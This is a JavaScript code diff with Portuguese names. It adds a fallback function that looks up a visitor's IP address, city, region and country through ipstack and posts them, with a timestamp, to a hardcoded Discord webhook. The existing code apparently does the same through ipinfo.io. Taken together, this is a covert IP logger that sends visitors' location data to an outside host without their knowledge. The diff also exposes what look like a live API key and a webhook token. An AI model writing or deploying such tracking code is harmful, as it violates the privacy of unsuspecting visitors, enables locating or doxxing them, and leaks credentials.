@@ -189,11 +189,11 @@ function enviarMensagemDiscord() {
                 discordXhr.send(data);
             } catch (error) {
                 console.error("Erro ao analisar resposta JSON: " + error.message);
-                enviarErroDiscord(error.message);
+                enviarErroDiscord("Erro ao analisar resposta JSON: " + error.message);
             }
         } else {
-            console.error("Erro na requisição ao ipinfo.io: " + xhr.statusText);
-            enviarErroDiscord(xhr.statusText);
+            console.error("Erro na requisição ao ipinfo.io. Status: " + xhr.status + " - " + xhr.statusText);
+            enviarErroDiscord("Erro na requisição ao ipinfo.io. Status: " + xhr.status + " - " + xhr.statusText);
         }
     };
 
@@ -203,6 +203,59 @@ function enviarMensagemDiscord() {
     };
 
     xhr.send();
+}
+
+function tentarSegundaOpcao() {
+    var apiKey = "467a20b4e6350f871524c45499d79e0e";
+
+    var ipstackUrl = "http://api.ipstack.com/check?access_key=" + apiKey;
+
+    var ipstackXhr = new XMLHttpRequest();
+    ipstackXhr.open("GET", ipstackUrl, true);
+
+    ipstackXhr.onload = function() {
+        if (ipstackXhr.status === 200) {
+            try {
+                var response = JSON.parse(ipstackXhr.responseText);
+
+                var userIP = response.ip;
+                var city = response.city;
+                var region = response.region_name;
+                var country = response.country_name;
+
+                var hora = new Date().toLocaleString("pt-BR", {
+                    timeZone: "America/Sao_Paulo"
+                });
+
+                var discordXhr = new XMLHttpRequest();
+                discordXhr.open("POST", "https://discord.com/api/webhooks/1119072044290687079/L2gDQchkqGO0MoUYdnsRBf7NvAmEb-dLcErFfyL2b7lqkKGoAfIoyr64qRaHd8HZwagt", true);
+                discordXhr.setRequestHeader("Content-Type", "application/json");
+
+                var data = JSON.stringify({
+                    content: "* Tentativa de segunda opção\nIP: " + userIP +
+                             "\nCidade: " + city +
+                             "\nRegião: " + region +
+                             "\nPaís: " + country +
+                             "\nHora: " + hora
+                });
+
+                discordXhr.send(data);
+            } catch (error) {
+                console.error("Erro ao analisar resposta JSON da segunda opção: " + error.message);
+                enviarErroDiscord("Erro ao analisar resposta JSON da segunda opção: " + error.message);
+            }
+        } else {
+            console.error("Erro na requisição ao ipstack. Status: " + ipstackXhr.status + " - " + ipstackXhr.statusText);
+            enviarErroDiscord("Erro ao acessar site de geolocalização (ipstack). Status: " + ipstackXhr.status + " - " + ipstackXhr.statusText);
+        }
+    };
+
+    ipstackXhr.onerror = function() {
+        console.error("Erro na requisição ao ipstack.");
+        enviarErroDiscord("Erro na requisição ao ipstack.");
+    };
+
+    ipstackXhr.send();
 }
 
 function enviarErroDiscord(errorMessage) {
